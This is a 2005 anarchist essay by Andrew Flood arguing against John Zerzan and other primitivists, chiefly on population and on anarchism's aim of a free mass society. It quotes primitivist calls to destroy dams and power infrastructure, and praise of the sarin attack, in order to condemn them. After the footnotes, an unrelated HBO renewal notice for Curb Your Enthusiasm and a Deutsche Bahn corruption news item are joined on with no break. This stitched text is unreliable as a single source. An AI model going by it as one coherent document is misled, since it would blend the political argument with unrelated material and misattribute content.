Is primitivism realistic ?
An anarchist reply to John Zerzan and others international | anarchist movement | feature Thursday December 01 , 2005 22:15 Thursday December 01 , 2005 22:15 by Andrew Flood - WSM ( personal capacity ) by Andrew Flood - WSM ( personal capacity )
A reply to primitivist critiques of ' Civilisation , Primitivism and Anarchism '
One of the major confusions in the anarchist movement in the USA and parts of Europe arises out of primitivism and its claim to be part of the anarchist movement .
But primitivism is not a realistic strategy for social revolution and it opposes the basic purpose of anarchism - the creation of a free mass society .
Primitivists have attempted to reply to these criticisms but these replies are easily exposed as more to do with faith then reality .
Sections of the actual anarchist movement have also constructed a set of ideological positions that almost seem designed to make successful mass work impossible .
Large sections of the anarchist movement seem to have forgotten that the goal of anarchism is to change the world , not simply to provide a critique of the left or be a minor thorn in the side of the state .
Ill summarise my argument from the previous essay .
Primitivism generally argues that the development of agriculture was where it all went wrong .
It therefore implies we should return to pre-agricultural methods of getting food , that is hunter - gathering .
But agriculture allows us to get vastly greater quantities of food from a given area .
Estimates can be made of how many people could live on the planet as hunter - gathers based on the amount of food that would be available to them .
These estimates suggest a maximum population of around 100 million .

Is primitivism realistic :
an anarchist reply to John Zerzan and others Last year I published the article ' Last year I published the article ' Civilisation , Primitivism and Anarchism '* to sketch out what I saw as the glaring contradictions in primitivism and where it clashed with anarchism .
Primitivism , I argued , was an absurdity that could never happen without the ' removal ' of the vast majority of the world 's population .
And far from being related to anarchism it was in contradiction with the basic tenet of anarchism ; the possibility of having a free mass society without a state .
The article has circulated on and off - line over the year and sparked numerous discussions .
A number of primitivists , including John Zerzan ( 1 ) , have replied directly to it , and others have published what appear to be indirect replies .
Here I want to answer the direct replies and , in doing so , expand the critique of primitivism .
The original essay was also using ' primitivism ' as a stalking horse to address what I see as one of the major problems in anarchism as it appears in the ' English speaking ' world .
That is a large - scale failure to take itself seriously .
So - called anarcho - primitivism is the most obvious example .
But sections of the actual anarchist movement have also constructed a set of ideological positions that almost seem designed to make successful mass work impossible .
Large sections of the anarchist movement seem to have forgotten that the goal of anarchism is to change the world , not simply to provide a critique of the left or be a minor thorn in the side of the state .
Is primitivism realistic ?
This reply continues in the same vein , on the surface it is about primitivism but you do n't have to dig that deep to see that some of the criticisms can be applied in a more general sense .
A good place to start in that context is with a poster calling himself Aragon who posted on more than one of the sites that carried the original article .
In a comment on AnarchistNews.org Aragon states that Flood " seems to focus his critique on what he calls the question of whether primitivism provides any sort of realistic alternative  which always seems like a bizarre metric for an anarchist to use as measurement  ( 2 ) .
This is the statement that inspired the title of this essay .
Here we have someone who openly proclaims it to be bizarre to even ask if primitivism provides a realistic alternative to capitalism .
Far from being a refutation to the original essay this re-enforces the central point of it .
That there is no way the advocates of primitivism could take the idea seriously if they thought its consequences through .
A lot of primitivism theory strikes me as the work of those who like playing with ideas but really have no idea of how these ideas could be implemented .
As with Aragon who even finds the idea of implementation of his own ideas bizarre .
But this is also a problem in the anarchist movement .
All too often plans are drawn up or slogans trotted out without asking if they are realistic .
Can they actually achieve what they claim to be about ?
The only test that appears to be used is whether the plan is ' pure ' enough .
What sort of test is this for anything except perhaps for a religious sect ?
The core issue Generally responses to the essay from primitivists were often a lot more constructive then what I expected .
I expected to get mostly abuse , and I did but a few did attempt to address the arguments .
However there was no real attempt to address the core point of my original article .
Which was that the ' population question ' made a joke out of any claim by primitivism to be anything beyond a critique of the world .
This is unsurprising - as far as I can tell there is no answer to the very obvious problem that emerges when you compare the number of people living on the planet ( 6 billion plus ) and the optimistic maximum of 100 million ( 2 % of this ) that the planet might be able to support if civilisation was abandoned for a return to a hunter - gather existence ( 3 ) .
Ill summarise my argument from the previous essay .
Primitivism generally argues that the development of agriculture was where it all went wrong .
It therefore implies we should return to pre-agricultural methods of getting food , that is hunter - gathering .
But agriculture allows us to get vastly greater quantities of food from a given area .
Estimates can be made of how many people could live on the planet as hunter - gathers based on the amount of food that would be available to them .
These estimates suggest a maximum population of around 100 million .
This is what is called an  Elephant in the living room argument .
The question of what would happen to the other 5,900 million people is so dominant that it makes discussion of the various other claims made by primitivism seem a waste of time until the population question is answered .
Yet the only attempts at a response showed a rather touching faith in technology and civilisation , quite a surprise ( 4 ) .
This response can by summarised as that such population reductions can happen slowly over time because people can be convinced to have fewer or even no children .
There was no attempted explanation for how convincing the 6 billion people of the earth to have no children might go ahead .
Programs that advocate lower numbers of children are hardly a new idea .
They have already been implemented both nationally and globally without much success .
China 's infamous ' One Child ' program includes a high degree of compulsion but has not even resulted in a population decrease .
China 's population is forecast to grow by 100 to 250 million by 2025 .
An explanation of how primitivists hope to achieve by persuasion what others have already failed to do by compulsion is needed yet no such attempt to even sketch this out exists .
As if this was not difficult enough for primitivists the implications of other arguments they make turn an impossible task into an even more impossible task .
For primitivist arguments normally include the idea that civilisation is about to create a major crisis that will either end , or come close to ending life on the planet .
Whether caused by peak oil , global warming or another side effect of technology we are told this crisis is at best a few decades away .
Even if primitivists could magically convince the entire population of the planet to have few or no children this process could only reduce the population over generations .
But if a crisis is only decades away there is no time for this strategy .
For even if 90 % of the population was to be magically convinced tomorrow it would still take decades for the population to reduce to the 100 million or less that could be supported by hunter - gathering .
And in the real world there is no mechanism for magically convincing people of any argument  not least one that requires them to ignore what many people find to be a fundamental biological drive to have children .
Some of the older primitivists I know even have children themselves .
If they cant convince themselves then why do they think they can convince everyone else ?
The contradiction between these two positions is so obvious that I can only conclude that those primitivists who have put forward this ' convince everyone to have fewer babies ' position have only done so in order to shore up their faith .
It is an argument invented to try and hide the elephant in the living room but really it only hides it from themselves .
It is impossible to see how they could expect anyone else to find it a convincing answer to the population question .
Zerzan 's reply John Zerzan 's reply to my essay included a variation of this defence of primitivism .
" It could also be noted that population is hardly a given .
It seems to be more an effect than a cause , for instance : an effect of domestication ab origino ( Latin for ' from the beginning / from the source ' ( 5 ) ) , if we are talking about civilization .
And so it seems to me likely that the numbers might come down fairly quickly were we to move away from domestication .
I do not know anyone who says this could happen overnight , Flood to the contrary . ( 1 ) "
Well first off population is a given .
I am not imagining that there are 6 billion people on the earth - there are six billion plus on the planet .
We cannot simply wish that there were 100 million .
There are 6 billion and this is a figure that is forecast to rise .
Whatever about the forces that drove the development of agriculture 12,000 years ago ( where there is a debate about cause and effect ) the reality today is that stopping the cultivation of all domestic plants and animals would result in the death by starvation of 5.9 billion people .
So yes a move away from domestication would indeed mean that " numbers might come down fairly quickly " : starvation only takes a few months .
Zerzan is also misquoting me .
I never claimed that some primitivists said civilisation had to go " overnight " .
One can see why Zerzan needed to invent this particular red herring , like other primitivists he believes that time is running out .
In an interview with fellow primitivist academic Derrick Jensen , Zerzan himself said " in a few decades there wo n't be much left to fight for .
Especially when you consider the acceleration of environmental degradation and personal dehumanization . "
Again Ill point out if we only have a few decades  this is hardly the time span in which a ' voluntary ' reduction of the earth 's population by some 98 % could occur .
In particular as the Earths population is actually forecast to rise to perhaps to as much as 10 billion in that time .
The evasive language Zerzan uses in his response to me is typical of the primitivist approach to the population question .
And although he might throw out the red herring that " I do not know anyone who says this could happen overnight " in the original essay I actually quoted some primitivists who either saw the collapse of civilisation as a short term inevitability or who worse - like Derrick Jensen - wanted to bring it on .
As I pointed out in the original article , Jensen is on record as writing " I want civilization brought down and I want it brought down now  ( 6 ) .
In fact since my article was published he has taken this further with a call for concrete action " We need people to take out dams , and we need people to knock out electrical infrastructures " ( 7 ) .
So while Zerzan may be smart enough to be evasive on this not all of his followers are ( 8 ) .
And while Zerzan may have forgotten Jensen he does know him - at least he was interviewed by him in 2000 ( 9 ) and the 10,000 word interview that was published which would suggest they have at least spent some hours in each others company .
Zerzan , like other primitivists , continues to evade the logic of his own position .
It 's all very well to talk of a gradual population reduction but just how does he think primitivists are going to achieve a population reduction from 6 billion to 0.1 billion " in a few decades " ?
What would be gradual about this ?
This would require a ban on all but 2 % of the earth 's population having any children at all !
The ball is really in Zerzan 's court ; he needs to demonstrate a mechanism for a non-compulsory and rapid reduction in population that would require the vast majority of the earth 's population to be happy to have no children at all .
He needs to explain how he can even explain this message to all of the people in the world - never mind convince them of it .
And Zerzan needs a ' voluntary ' mechanism of ensuring that those he fails to convince do not undermine this reduction , for instance religious or other minorities who disagree with the primitivists and choose to have many children .
And all this has to happen within his own deadline of " a few decades " .
With this sort of burden of proof it is easy to see why primitivists are not so keen on demonstrating that they have a realistic alternative .
The nasty side
Those not blinded by ideology looking at this burden of proof will conclude either that primitivism is of no practical use or that those primitivists who are rational and still hold to primitivism have some program they are not revealing .
Quite clearly some of those who see themselves as primitivists do favour die offs or advocate policies that would make them inevitable .
Jensen 's call for people " to take out dams ... to knock out electrical infrastructures " would result in large numbers of deaths if any number of people were to take him seriously .
It 's just a toned down version of Steve Booth 's lauding of the Tokyo Sarin attacks and Booth 's fantasy in Green Anarchist that " One day the groups will be totally secretive and their methods of fumigation will be completely effective . "
These sorts of murderous anti-human sentiments are not only tolerated within primitivism but their authors are promoted - you 'll find their essays uncritically reproduced all over the web and in various print publications .
My previous essay produced howls of outrage because I pointed out the existence of such writings .
But the problem here is not that I point out their existence , it is that the primitivists ignore them until it is pointed out .
Yet they work with these people , they publish these people and then they shuffle around with embarrassment and cry unfair when what they say is pointed out .
And it is not just the primitivists even sections of the anarchist movement in the name of maintaining a broad church uncritically publish Jensen and invite him to address meetings .
This is quite astounding given the consequences of what he is advocating .
I can only presume he is tolerated in some anarchist circles because of the general confusion that equates militant tactics with militant politics , forgetting that elements of the far right can also use militant tactics .
There is no critique of the die off point of view from those who call themselves ' anarcho ' - primitivists .
Zerzan is happy to do a lengthy interview with someone who says he wants " civilization brought down and I want it brought down now " without even bringing the consequences of such a position up with them .
If he wanted to distance himself from Jensen he has already had the opportunity to do so .
The centrality of the agricultural revolution Elsewhere Zerzan has written of the development of agriculture that ;
" The debasing of life in all spheres , now proceeding at a quickening pace , stems from the dynamics of civilization itself .
Domestication of animals and plants , a process only 10,000 years old , has penetrated every square inch of the planet .
The result is the elimination of individual and community autonomy and health , as well as the rampant , accelerating destruction of the natural world 
( 10 ) This is relevant because a number of people who replied objected to me choosing the development of agriculture as the point at which civilisation can be said to have developed ( 11 ) .
But as the original essay explained , " Of course civilization is a rather general term ..
For the purposes of this article I 'm taking as a starting point that the form of future society that primitivists argue for would be broadly similar in technological terms to that which existed around 12,000 years ago on earth , at the dawn of the agricultural revolution " .
I could have picked an older date - the first cave paintings for instance but this would not only have been more arbitrary but would have presented an even greater population problem for the primitivists .
I could have picked a more recent date but this would hardly have helped the primitivists as they then would have had to include many of the features of civilisation - including the state - in their primitive utopia .
And , as our ability to support a large population has escalated sharply in recent years , even a ' primitive ' society that only aimed to return to say , 1800 would still have to get rid of the majority of the earth 's population .
Evasion aside , it is quite clear that from the primitivist point of view it was the agricultural revolution and the changes that happened alongside this where things went bad .
For understandable reasons ( not wanting to deal with the population question ) primitivists and their fellow travellers tend to avoid any date even as general as the agricultural revolution .
But it 's the one I choose to work with and this appears to be fair enough with those primitivists more willingly to openly argue their position .
Agriculture also seems a very logical starting point because agriculture is what makes a mass society possible .
Hunter - gathers can't gather in large groups for a long period because they exhaust local food sources .
Nor do small groups of hunter - gathers generally have the surplus food required to develop a high degree of specialisation of labour , and any specialisation is a bad thing according to most primitivists .
I also think its hard to construct a coherent primitivism that does not exclude agriculture since the dawn of agriculture and class society seem to occur together .
This fact has been understood on the left at least as far back as Engels  The Origin of the Family , Private Property and the State and Ill discuss its implications next .
But in terms of the overall argument about food production this is a side argument - the earths current population requires the agricultural technology of the last 100 odd years - going back to primitive agriculture is not much more of an option then going back to Hunter - gathering .
It would still leave billions of facing death by starvation .
Is primitivism a branch of anarchism ?
It is true that agriculture is required before the surplus is generated on which a state structure can be built .
This is about the only argument the primitivists have - the state has always been a feature of civilisation .
The challenge for those who want to abolish the state - and this has always been understood as a central challenge of anarchism from the 1860's - is to create a civilisation that does not have the mechanisms of state repression that all civilisations to date have had .
This brings me onto another issue that upset some of those who wrote replies to my essay .
Teapolitik 's " Primitivism is n't , in itself , a critique of anarchism at all .
It is a supplement to anarchism " is the best - developed expression of this sort of reply .
Teapolitik goes on to assert that " civilization ( and for some , technology , agriculture , language , and other products of human society ) is not compatible with ecological sustainability -- and that the persistence of civilization , whether feudal , capitalist , socialist or anarchist , would lead to the eventual destruction of the life - sustaining qualities of this planet . "
( 11 I think the case for primitivism being a break with rather than a development of anarchism is very clear - I outlined this at some length in my original article .
The primitivist argument is essentially identical to the liberal argument for why the state is necessary .
The state they claim is what allows mass society to exist - without the state we would have ' the war of all against all ' .
The primitivists agree but as they are anti-state they are therefore required to also be anti-mass society .
Yet the origins of anarchism lie in a movement that sought to go beyond this seeming contradiction - a movement built on the idea that you could have a free society without the state .
This was the ideological corner stone on which anarchism is founded .
Bakunin , for instance writing on Rousseau 's Theory of the State , wrote in words that are as applicable to the core argument of primitivism as they were at the time to liberalism that ; " According to the theory .. primitive men enjoying absolute liberty only in isolation are antisocial by nature .
When forced to associate they destroy each other 's freedom .
If this struggle is unchecked it can lead to mutual extermination .
But for anarchists " it is now proven that no state could exist without committing crimes , or at least without contemplating and planning them , even when its impotence should prevent it from perpetrating crimes , we today conclude in favour of the absolute need of destroying the states .
Or , if it is so decided , their radical and complete transformation so that , ceasing to be powers centralised and organised from the top down , by violence or by authority of some principle , they may recognise -- with absolute liberty for all the parties to unite or not to unite , and with liberty for each of these always to leave a union even when freely entered into -- from the bottom up , according to the real needs and the natural tendencies of the parties , through the free federation of individuals , associations , communes , districts , provinces , and nations within humanity . "
( 12 ) Bakunins argument is that liberals insist that large numbers of people cannot live together without a state to supervise them as they would come into conflict with each other .
But anarchists insist that large numbers of people can come together and preserve their freedom though a range of bottom up organising methods .
Mass society and freedom are possible .
This is something primitivists deny .
In a similar vein Kropotkin wrote ; " recent evolution has prepared the way for showing the necessity and possibility of a higher form of social organisation that may guarantee economic freedom without reducing the individual to the role of a slave to the State .
The origins of government have been carefully studied , and all metaphysical conceptions as to its divine or " social contract " derivation having been laid aside , it appears that it is among us of a relatively modern origin , and that its powers have grown precisely in proportion as the division of society into the privileged and unprivileged classes was growing in the course of ages ( 13 ) .
Here Kroptkin is arguing that humanity can create forms of mass organisation that do not require the state and which can create economic freedom .
And while the liberals may argue that the state is required for the existence of mass society this seems to be a recent argument invented to justify the division of society into classes .
As can be seen - from the beginning - anarchism has included a rejection of the core idea of primitivism - that there is an irreconcilable contradiction between mass society and liberty .
It has sought alternative ways to organize mass society that eliminate the role of the state .
For these " free federation of individuals , associations , communes , districts , provinces , and nations within humanity " are all features of mass society .
In the 1860 's the argument that there was such an irreconcilable contradiction was an anti-anarchist argument - one that the anarchists took the time to refute .
To try and incorporate the same argument into anarchism today is to make nonsense of the term anarchism .
For some reason there is a very strong tendency in the USA for the emergence of ideologies which use the label anarchist but which are in reality at odds with anarchism .
There have been at least three such streams in the last two decades , ' anarcho ' - capitalism , post - leftism and anarcho - primitivism .
All three have used a similar methodology of trying to re-label anarchism as ' left anarchism ' ( or sometimes 'red anarchism ' ) .
All three have shared the same ideological anti-communist ' rugged individualism ' by which all forms of collective mass organisation can only be authoritarian .
It is hard not to write this off as simply a radical reflections of the state ideology of the USA .
In the case of primitivism it also accepts George Bush 's claims that USA society has to have the car culture .
For Bush this means the USA has to sacrifice the environment in order to maintain its current standard of living .
Primitivism accepts the first claim but unlike Bush rejects the price as too great to carry .
So primitivism seeks the end of civilization itself .
Like Bush it also seems unwilling to admit that elsewhere on the planet people already organise their lives in ways that have a much lower energy demand .
Even Western Europe which has a similar standard of living to the USA has per person a use of energy half that of the USA .
Technology
The technology question causes a huge amount of confusion with primitivists mixing up a particular form or consequence of technology with the technology itself .
I had tried to deal with this in the original essay using the example of motorised transport .
Yet some replies were from people in the USA who could n't get their heads around the idea of the technology of motorised transport being used in any other way than the way it is used in the USA .
There it is perhaps more reasonable for someone to believe that car culture could not be likely eliminated without destroying civilisation ( 14 ) .
US culture and urban geography means that right now there are huge areas of the country where owning a car is pretty essential to survival .
But this is n't typical of the rest of the world , not even of parts of the US .
If you lived in Manhattan for instance , for day - to - day life a car is more of a problem then a requirement .
People across huge areas of the planet have a very low percentage of car ownership - in the most part because people are too poor to afford individual cars .
Yet those with money still have access to mass transportation .
If you go anywhere in North Africa you can travel long distances rapidly and at ease , reaching even quite small towns because the lack of individual car ownership has created a market for an incredibly sophisticated network of collective taxis .
They leave from fixed points in each town whenever a vehicle is full .
Really busy routes also have trains and buses .
The point is that even under capitalism alternative ways of dealing with the need for transportation already exist - there is nothing inevitable about the ' car culture ' that is a feature of how the technology of the internal combustion engine has been used in the USA .
Some of the replies focused on my treatment of technology and in particular the contention that the only way out of the population crisis is both more technology and more access to technology .
Unsurprisingly , as I used the peak oil theory in the original essay this resulted in discussion on some of the sites dedicated to discussing Peak Oil .
Omar for instance thought this means I " argue technology as the saviour " ( 15 ) - others even thought this meant I was in favour of atomic weapons !
These misunderstandings are probably my fault for stating the case too crudely in the original .
It is worth deepening the discussion .
My position it that the combination of modern capitalism and the way it uses technology has given us an unstable and unsustainable economic system that only even attempts to address the interests of a small minority of the planets population .
And although I may not believe ' the end is nigh ' I do accept that things cannot go on as they are without major problems .
Of course being an anarchist I already want to overthrow capitalism and see the economy restructured from top to bottom .
So saying things cannot continue as they are presents me with no difficulties .
However unlike some Peak Oil enthusiasts and all primitivists I am not willing to argue that we need to ' go back ' to some simpler time when less energy inputs were required because that would involve accepting the removal of billions of people from the planet .
A social revolution that not only introduces new technology but re-models what already exists is the only logical way forward .
In that context technology is what we do with it .
In the general sense it is neither liberatory nor repressive .
Particular applications of technology may be either - a rifle in the hands of a US marine is different in that sense from a rifle in the hands of a Zapatista .
The birth control pill certainly plays a part in giving women choices about reproduction that were previously hard to come by safely .
It also allows here to control her fertility without the co-operation of her partner .
On the other hand it is impossible to think of a positive use of the electric chair or a nuclear bomb .
It is also true that the development of technology made it possible to have a society where there was a division into workers and bosses .
Once you can store surplus food for instance you can have accumulation of meaningful wealth and so the ability to pay the soldier , the policeman and the executioner .
So the question comes down to whether its possible to have a free technological society - and anarchism insists it is - or whether the choice is between a primitive ' freedom ' and an oppressive technological society .
The vast majority of political theories , perhaps all except anarchism , do indeed claim you cannot have a free technological society .
I think it is worth hoping they are wrong even if we have never as yet had such a society .
That a free technological society is possible is - as I have argued - the central point of anarchism .
Some of the odder stuff
The replies also included areas that in my view are of much lesser importance ( 16 ) .
Amongst those are responses from some who attempt to blend primitivism into vegetarianism or even veganism ( 17 ) .
This really only serves to underline how some primitivists have not really given any serious thought to what they advocate at all - very few ecosystems could support vegan humans attempting to live off the land without agriculture .
As far as I 'm aware all ' primitive ' societies that exist today on the planet carry out hunting as well as gathering .
In this context I am indeed a " damn speciesist " who does n't have a problem with humans " exploiting the land for you own good ( taking away vital habitat and feeding ground ) " .
Ecological diversity should be preserved because it is in our ability to do so and doing so will be good for us rather than because we prefer trees to people or because otherwise the earth will be upset .
All actually existing ' primitive ' peoples are " speciesist " - they hunt animals .
The luxury of some people choosing not to eat meat at all is a feature of civilization .
Abstract or symbolic - who cares ?
Ill also deal with the remainder of Zerzan 's reply to my original essay here as he is the the leading light of ' anarcho ' primitivism and Id hate people to think I was avoiding part of his argument ..
The remainder of his reply reads ; " Flood probably knows that nowhere have I rejected " abstract thought " but it better serves his weak assault on " primitivism " to say otherwise .
Some of our ancestors were cooking with fire 2 million years ago , travelling on the open seas 800,000 years ago .
And yet the evidence for symbolic culture hardly goes back 40,000 years .
Thus , it would seem , there was intelligence that preceded what we think of as symbolic .
Possibly a more direct kind in keeping with a more direct connection with the natural world .
Well , this is a long topic that I wo n't try to rehash here .
One that does n't quite fit Flood 's sound byte characterization ... " (1 ) This section appears to be a reply to where I was explaining my methodology in choosing ' agriculture ' as representing the start of civilization .
I 'd actually mentioned Zerzan only twice in the original article .
Why might I have thought Zerzan rejected ' abstract thought ' ?
Well partly because I had presumed " symbolic thought " and " abstract thought " pretty much amounted to the same thing .
But in any case Zerzan has also appeared to specifically attack " abstract thought " .
In his essay on " Number : Its Origin and Evolution " ( 18 ) he writes , " Math is the paradigm of abstract thought " and then " Mathematics is reified , ritualized thought , the virtual abandonment of thinking " .
To me this - and similar sentiments along the same lines elsewhere in his essay - sound a lot like a rejection of abstract thought .
In his reply he also seems keen to tell me you can have intelligence without " symbolic culture " .
I can only agree - geese for instance manage to migrate large distances but do n't as far as I 'm aware produce any art .
But he may be wrong that evidence for symbolic culture in humans only goes back 40,000 years .
Ian Watts of University College London claims red ochre and other red pigments were being used at least 100,000 and 120,000 years ago and that " new findings in Zambia and the re-dating of the important Border Cave site in South Africa push the date of the earliest use back further still - perhaps to 170,000 years ago in Zambia .  ( 19 ) Given that the " oldest fossil evidence for anatomically modern humans is about 130,000 years old " ( 20 ) this would suggest symbolic culture ( or symbolic thought ) is as old as homo sapiens .
Anyway , to be honest , I 'm all for abstract thought .
I like the ability to read a text , to think about its contents and perhaps then to argue against it .
This ability is what is needed to create freedom , it has been at the centre of all modern revolutionary processes .
Even if we could , why would we want to give up the ability to think abstractly ?
Class conflict ?
Teapolitik and other commentators take issue with me pointing out that even if a major environmental crisis resulted in large - scale death and destruction this would not necessarily mean the end of capitalism .
Teapolitik asserts that " A tiny wealthy elite could not possibly continue to control vast natural resources in the event of collapse -- when one elite can no longer hold a carrot in front of thousands of poor , those poor will revolt . " [ 11 ]
This assertion is wishful thinking for two reasons - not least that the ruling class has seldom maintained power through dangling the carrot alone .
Firstly it presumes that the crisis will somehow creep up on the ruling class - that they will be unable to react or prepare for it .
Capitalism is very much more adaptable than this .
For example there has been a huge amount of research on alternative energy sources over the last few years as some capitalists anticipate making a substantial profit out of peak oil .
On flicking through a recent issue of the ' Economist ' magazine - which is close to being a bible for many CEO's - I noticed that 6 out of the dozen or so glossy full page ads were to do with alternatives to oil or energy saving technologies like hybrid cars .
The transnational corporation BP ( British Petroleum ) Amoco rebranded itself Beyond Petroleum back in the year 2000 .
Although this was rightly seen as at attempt to Greenwash it was also to manovure itself for the new energy markets that would open up as oil declined .
On a more local scale the large scale destruction from Hurricane Katrina is actually being used by capitalism to restructure parts of the New Orleans economy in their interests .
Anarcho has written that Bush 's plans for New Orleans amount to a ; " blank sheet upon which the far - right will unleash their plans for social engineering .
Children will go to school with vouchers .
Wages will be lowered and regulations waived to accommodate the bosses .
The entire area will become a free - enterprise zone .
A flat tax will be imposed .
All under the guise of economic revival premised on the belief that corporations freed from trades unions , workers rights , environmental restrictions and taxes will reap huge profits and those profits will grow the pie for everybody " ( 24 ) .
This is the way capitalism works - crisis are opportunities for new investment for those companies in favour ( e.g. Halliburton in Iraq ) and excuses to impose cuts on the working class ( e.g. the introduction of the bin tax in Dublin ) .
Mass death and destruction have often been a central part of the development of capitalism - not a threat to it .
For capitalism they can be opportunities to remove ' unproductive people ' from the land .
( e.g. Irish famine of the 1840's ) .
Much of the original wealth on which capitalism was founded was part and parcel of the process that almost entirely wiped out the indigenous people of the America's .
Today tens of millions of people die every year from diseases that are easily preventable .
There is also nothing automatic about poverty or a decline in living standards being met with mass revolt .
Capitalism , and the market in particular , is also an inbuilt mechanism though which the population are encouraged to accept the hoarding of scarce resources as natural .
In the west today this means the rich have access to fast cars , luxury homes and private yachts - not that much of a hardship for the rest of us .
But elsewhere in the world the rich have access to these things while the poor literally starve in the streets .
If there was to be a real crisis in world food production then this is what would visit the working class in the USA and beyond .
To a minor extent this is what happened in depression era America and in post war Europe .
In neither case did it lead to significant revolts never mind the collapse of civilisation .
The second reason why a major crisis would not automatically lead to the fall of capitalism is more brutal .
The need to spell it out simply reflects the rather naive thinking of a lot of primitivists when it comes to the ruthless nature of capitalism .
Jay Gould the US financier & railroad businessman summed up this nature when he said , " I can hire one half of the working class to kill the other half . "
Outside of a recent brief period in Western Europe and the USA capitalism has routinely deployed enormous repressive forces to defeat rebellion .
In the 1970's it created military dictatorships , which killed tens of thousands of people across South America .
In Central America in the 1980's it killed hundreds of thousands .
There have been moments in history when the ruling class was at least briefly defeated - the Russian and Spanish revolutions being the most common examples .
But this was not a simple product of desperation - if desperation led to revolution than revolution would have swept the African ruling class away years ago .
It was also a product of revolutionary organisation stretching over decades and a set of revolutionary ideas that could unite people in the struggle for a better world .
Large - scale crisis can indeed bring about large - scale upheavals but without a positive revolutionary program that unites people such upheavals always end up with a new faction of the ruling class in the driving seat .
In fact capitalism and the ruling class are so flexible that they can undergo apparent defeat only to end up back in control in a new form within years - as happened in Russia after 1917 .
So yes , unless we are organised on a mass scale a " tiny wealthy elite " will indeed " continue to control vast natural resources in the event of collapse " .
They have hundreds of years of experience of doing just that .
And they wo n't just use the much - depleted carrot to do so , they also have the stick and for much of world history it is the stick rather than the carrot that has had the lead role in keeping people in line .
Technological developments mean one man in a helicopter can provide the same level of ' stick ' that previously an army of hundreds was required for .
They can still hire one half of the working class to kill the other half but in repression as with other areas these days they are able to downsize .
Hope for the future Primitivism offers no hope and no program for a revolutionary change of society .
It includes some of the most reactionary and anti-human writings this side of fascism 
Ive even read primitivists writing off the death of the mass of the worlds population on the grounds that quite a few of those 5.9 billion are just empty shells  ( 22 ) .
But even the best of the writings offer no more than some interesting ideas to ponder over - ideas that have been around for the last 200 years .
There are real problems associated with the growth of the human population and the wasteful nature of capitalism .
We are already seeing the emergence of long - term environmental problems even if the end is not yet nigh .
But bad as the effects on the environment are , the real shame is that we live on a planet where millions starve in order that a tiny ruling class can live in absolute luxury .
Anarchism offers an alternative to the capitalist system - an alternative that can provide a decent life for everyone on the planet both in terms of material good and control over their own lives .
But achieving this alternative is not a question of waiting for people to rise up - it is a question of organising the vast majority of the planet against the tiny elite who rule us .
Anarchist communism provides the best hope for freedom and the best model for fighting for freedom .
It distils the lessons of hundreds of years of struggle - and of all the successes and failing of these struggles .
It does not have ' the answer ' ; that is something that can only be created by the self - managed struggle of the mass of the population of this planet .
Our role is to help the emergence of this struggle .

The first comment in reply to the posting of the article on Anarchist News appears to be from Zerzan ( it 's posted anonymously but refers to ' I ' in disputing what Zerzan has said and is signed JZ ) .
Mind you it could be another primitivist impersonating him - they do a fair bit of that .
http://anarchistnews.org/?q=node/200 2 At http://anarchistnews.org/?q=node/200#comment-679 - in fact ' Aragon ' may simply not understand what was said in the original as the realistic alternative referred to was in relation to current society and not social revolution i.e .
" Facing this challenge anarchists need to first look to see if primitivism offers any sort of realistic alternative to the world as it is . "

Note that this is an optimistic maximum - quite often I multiplied the real probable maximum by a figure of ten to avoid pointless arguments as to whether Ireland for instance could support 20,000 hunter gathers rather than the 7,000 my figures would calculate out .
I mention this because the folks over at Lib.Com.org did n't get what I was doing and ' corrected ' my error in the edited version they published at http://www.libcom.org/thought/approaches/primitivism/

By this I mean the persuasion mechanism proposed assumes some form of global communication in order to reach everyone on the planet - something that does not yet exist and some form of near 100 % reliable contraception that everyone on the planet could have access to - something else that does not yet exist !

It seems fair enough to describe Jensen as a follower of Zerzan as Jensen has described Zerzan as " The best anarchist thinker of our time " , " the most important anarchist thinker of our time " or more frankly " I love all of Zerzan 's books , but I think I love this one the best . "
In his review of Zerzans ' Against Civilization : Readings and Reflections " for Amazon.com 9 Derrick Jensen interviews John Zerzan , Alternative Press Review , at http://www.altpr.org/apr12/zerzan.html
Given that the Wikipedia entry on ' anarcho ' primitivism includes " in the United States primitivism has been notably advocated by writer John Zerzan and to a lesser extent author Derrick Jensen " I find Zerzan 's implied claim in his reply to me to have forgotten Jensen and what he has to say incredible - but maybe they have fallen out ?

It has always been Larry David ’s decision whether he wanted to do another season of Curb Your Enthusiasm or not , he pretty much has a blank signed renewal slip by HBO waiting on his desk .
And while the Seinfeld reunion at the end of Season 7 felt like an appropriate series finale , luckily for Curb fans , David decided to go for an eighth cycle .
This is great news for HBO too as it recently sold Curb in cable ( TV Guide ) and broadcast syndication .
LOS ANGELES , April 20 , 2010 – HBO has renewed the hit comedy series CURB YOUR ENTHUSIASM , starring Larry David , for a ten - episode eighth season , it was announced today by Michael Lombardo , president , Programming Group and West Coast Operations , HBO .
Production of the new episodes will begin this summer in Los Angeles and New York , with debut slated for 2011 .
Said Lombardo , “ Larry always loves to paint himself into a corner , and after the incredibly wonderful seventh season of CURB , you have to ask , ‘ How does he ever top this ? ’
But he always finds a way .
We ca n’t wait to see what he does in season eight . ”
“ After much soul searching – and by the way , it was nowhere to be found – I have decided to do another season of CURB , ” says Larry David .
“ I look forward to the end of shooting , when I can once again resume the hunt for my elusive soul .
I know it ’s here somewhere or perhaps in the rugged mountainous regions of Pakistan . ”
Under its new management team , Deutsche Bahn appears more determined than ever to crack down on corruption , especially as the railway operator prepares to expand beyond its home market .
The state - owned company , which has been stung by a string of corruption scandals in recent years , responded to new evidence of bribery in its consulting arm , Deutsche Bahn International , by hiring professional services group KPMG to conduct a special audit .
New evidence uncovered
The unit , which offers consultancy services worldwide to governments and other bodies planning and building railways , has been under investigation since 2005 for allegedly bribing officials in Algeria , Greece and Rwanda .
But new evidence uncovered by prosecutors in Frankfurt and presented to Deutsche Bahn last week prompted a decision for " swift action , " company spokesman Jens - Oliver Voss told Deutsche Welle .
Deutsche Bahn spied on staff in a scandal that forced CEO Mehdorn to resign
Voss said Deutsche Bahn has a fundamental interest in uncovering the truth about the transactions , noting that the company itself brought details of irregularities to the attention of prosecutors last year .
Its new senior management team , he added , " has given compliance the highest possible priority . "
In March 2009 , Hartmut Mehdorn was forced to resign as chief executive officer of Deutsche Bahn after being accused of breaching privacy laws while monitoring staff contacts with suppliers .
His successor Ruediger Grube introduced many changes , including the creation of a new board position for compliance , legal affairs , data protection and security .
Besides the new board position , Grube has hired additional compliance staff and introduced training courses to " modernize compliance " and ensure that business practices across the company meet all legal requirements , according to Peter von Blomberg with Transparency International , an organization that fights global corruption .
